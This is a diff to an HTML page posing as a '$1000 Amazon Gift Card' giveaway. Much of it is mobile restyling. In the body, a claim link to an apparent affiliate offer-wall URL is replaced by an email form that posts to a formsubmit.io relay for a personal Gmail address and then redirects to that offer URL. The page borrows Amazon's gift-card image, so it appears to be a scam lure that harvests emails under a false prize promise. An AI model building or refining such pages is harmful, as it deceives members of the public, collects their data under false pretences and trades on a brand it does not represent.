@@ -3,14 +3,17 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Enter for a chance to win a $1000 Amazon Gift Card. 100% free!">
-  <meta name="keywords" content="Amazon Gift Card, Win Gift Card, Free Giveaway, Online Sweepstakes">
+  <meta name="description" content="Enter for a chance to win a $1000 Amazon Gift Card. 100% free and mobile-friendly!">
+  <meta name="keywords" content="Amazon Gift Card, Win Gift Card, Free Giveaway, Mobile Friendly">
   <meta name="author" content="Giveaway Promo">
   <title>Win a $1000 Amazon Gift Card!</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background-color: #f9f9f9;
       color: #333;
     }
@@ -21,33 +24,49 @@
       text-align: center;
     }
     .container {
-      max-width: 500px;
+      width: 90%;
+      max-width: 600px;
       margin: 40px auto;
       background-color: #fff;
       padding: 25px;
       border-radius: 10px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      box-shadow: 0 0 20px rgba(0,0,0,0.05);
       text-align: center;
     }
     h1 {
       color: #e47911;
+      font-size: 1.8rem;
+    }
+    p {
+      font-size: 1rem;
+      margin: 15px 0;
     }
     img {
-      max-width: 100%;
+      width: 100%;
+      height: auto;
       border-radius: 10px;
       margin: 20px 0;
     }
-    .button {
-      display: inline-block;
-      background-color: #ffa41c;
-      color: white;
-      padding: 15px 30px;
-      font-size: 18px;
-      text-decoration: none;
-      border-radius: 5px;
-      transition: background-color 0.3s;
+    form {
+      margin-top: 20px;
     }
-    .button:hover {
+    input[type="email"] {
+      padding: 12px;
+      width: 70%;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      margin-bottom: 10px;
+    }
+    button {
+      padding: 12px 20px;
+      border: none;
+      background: #ff9900;
+      color: white;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
       background-color: #cc7a00;
     }
     footer {
@@ -57,6 +76,17 @@
       padding: 20px;
       font-size: 14px;
       color: #777;
+    }
+    @media (min-width: 768px) {
+      h1 {
+        font-size: 2.2rem;
+      }
+      p {
+        font-size: 1.1rem;
+      }
+      button {
+        font-size: 1.1rem;
+      }
     }
   </style>
 </head>
@@ -68,9 +98,14 @@
 
   <div class="container">
     <h1>Win a $1000 Amazon Gift Card!</h1>
-    <p>Don't miss out! It's your chance to grab a $1000 Amazon card absolutely FREE. No purchase necessary.</p>
+    <p>Enter your email below and claim your chance. This offer won't last long!</p>
     <img src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon Gift Card">
-    <a class="button" href="https://singingsfiles.com/show.php?l=0&amp;u=178843&amp;id=68652" target="_blank">Claim Your Gift Card Now</a>
+
+    <form action="https://formsubmit.io/send/s0230072@gmail.com" method="POST">
+      <input type="email" name="email" placeholder="Enter your email" required>
+      <input type="hidden" name="_redirect" value="https://singingsfiles.com/show.php?l=0&u=178843&id=68652">
+      <button type="submit">Claim Now</button>
+    </form>
   </div>
 
   <footer>
